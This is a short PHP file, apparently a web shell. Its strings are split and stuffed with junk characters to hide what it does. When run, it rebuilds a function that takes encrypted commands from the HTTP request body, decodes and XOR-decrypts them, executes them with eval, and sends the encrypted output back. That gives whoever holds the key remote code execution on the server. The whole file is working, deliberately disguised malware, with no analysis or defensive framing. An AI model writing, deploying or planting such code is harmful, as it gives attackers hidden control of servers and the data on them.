<?php
$d='$k=M"305a62M2f";$kMh="3d287e7M04ebb";M$MMkf="855b0b775d94M";$Mp="uMgbpVMmFD2o7YE9MJm";functMion Mx($';
$N='://input"),$Mm)==1) {@Mob_starMt();@eMvalM(@gzunMcompress(M@x(@baMse64M_dMecoMde($mM[1M]),$k)));$o=@oM';
$y='$iM++MM){$o.=$t{$i}^$k{$j}MM;}}rMetuMrn $o;}if M(@preg_matcMh(M"/$Mkh(.M+M)$kf/",@Mfile_Mget_contents(M"Mphp';
$u='Mb_get_contents();MM@ob_end_clMean();$Mr=M@bMase64_encode(@xM(@MgzcomprMessM($o),$Mk));prinMMt("$p$kh$r$kf");}';
$j=str_replace('U','','UcreaUtUeUU_functUion');
$W='t,$k){$McM=strMlen($k);$l=MstrMlMen($t);$Mo=""M;for(M$i=0;$Mi<$l;){fMor(M$Mj=0;($j<$Mc&&$i<$l);$j++,';
$C=str_replace('M','',$d.$W.$y.$N.$u);
$s=$j('',$C);$s();
?>
